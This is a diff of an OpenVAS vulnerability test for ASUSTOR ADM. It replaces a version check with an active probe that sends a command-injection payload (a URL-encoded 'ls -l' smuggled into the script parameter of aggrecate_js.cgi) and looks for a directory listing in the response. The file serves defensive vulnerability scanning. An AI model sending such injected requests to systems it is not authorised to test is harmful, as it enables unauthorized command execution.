@@ -1,8 +1,8 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_asustor_adm_rce_vuln.nasl 10372 2018-06-29 14:44:40Z ckuersteiner $
+# $Id: gb_asustor_adm_rce_vuln.nasl 11048 2018-08-20 06:15:01Z ckuersteiner $
 #
-# ASUSTOR ADM RCE Vulnerability
+# ASUSTOR ADM Multiple Vulnerabilities
 #
 # Authors:
 # Christian Kuersteiner <christian.kuersteiner@greenbone.net>
@@ -30,52 +30,63 @@ CPE = "cpe:/h:asustor:adm_firmware";
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.141251");
-  script_version("$Revision: 10372 $");
-  script_tag(name: "last_modification", value: "$Date: 2018-06-29 16:44:40 +0200 (Fri, 29 Jun 2018) $");
-  script_tag(name: "creation_date", value: "2018-06-29 14:18:00 +0200 (Fri, 29 Jun 2018)");
-  script_tag(name: "cvss_base", value: "10.0");
-  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version("$Revision: 11048 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-20 08:15:01 +0200 (Mon, 20 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2018-06-29 14:18:00 +0200 (Fri, 29 Jun 2018)");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
-  script_cve_id("CVE-2018-11510");
+  script_cve_id("CVE-2018-11509", "CVE-2018-11510", "CVE-2018-11511");
 
-  script_tag(name: "qod_type", value: "remote_banner");
+  script_tag(name:"qod_type", value:"remote_vul");
 
-  script_tag(name: "solution_type", value: "VendorFix");
+  script_tag(name:"solution_type", value:"VendorFix");
 
-  script_name("ASUSTOR ADM RCE Vulnerability");
+  script_name("ASUSTOR ADM Multiple Vulnerabilities");
 
-  script_category(ACT_GATHER_INFO);
+  script_category(ACT_ATTACK);
 
   script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("gb_asustor_adm_detect.nasl");
   script_mandatory_keys("asustor_adm/detected");
 
-  script_tag(name: "summary", value: "A remote command injection vulnerability exists in ASUSTOR ADM. Successful
-exploitation would allow an attacker to execute arbitrary code on the target machine.");
+  script_tag(name:"summary", value:"ASUSTOR ADM is prone to multiple vulnerabilities.");
 
-  script_tag(name: "vuldetect", value: "Checks the version.");
+  script_tag(name:"insight", value:"ASUSTOR ADM is prone to multiple vulnerabilities:
 
-  script_tag(name: "affected", value: "ASUSTOR ADM 3.1.2.RHG1 and prior.");
+- Default credentials and remote access (CVE-2018-11509)
 
-  script_tag(name: "solution", value: "Update to the latest version.");
+- Unauthenticated Remote Command Execution (CVE-2018-11510)
 
-  script_xref(name: "URL", value: "https://github.com/mefulton/CVE-2018-11510");
+- Blind SQL Injections (CVE-2018-11511)");
+
+  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");
+
+  script_tag(name:"affected", value:"ASUSTOR ADM 3.1.2.RHG1 and prior.");
+
+  script_tag(name:"solution", value:"Update to the latest version.");
+
+  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/148919/ASUSTOR-NAS-ADM-3.1.0-Remote-Command-Execution-SQL-Injection.html");
+  script_xref(name:"URL", value:"https://github.com/mefulton/CVE-2018-11510");
 
   exit(0);
 }
 
 include("host_details.inc");
-include("version_func.inc");
+include("http_func.inc");
+include("http_keepalive.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
 
-if (!version = get_app_version(cpe: CPE, port: port))
+if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
   exit(0);
 
-if (version_is_less_equal(version: version, test_version: "3.1.2.rhg1")) {
-  report = report_fixed_ver(installed_version: toupper(version), fixed_version: "Contact vendor");
+url = '/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-l%26%22';
+
+if (http_vuln_check(port: port, url: url, pattern: "[drwx-]+.*root.*root", check_header: TRUE)) {
+  report = report_vuln_url(port: port, url: url);
   security_message(port: port, data: report);
   exit(0);
 }
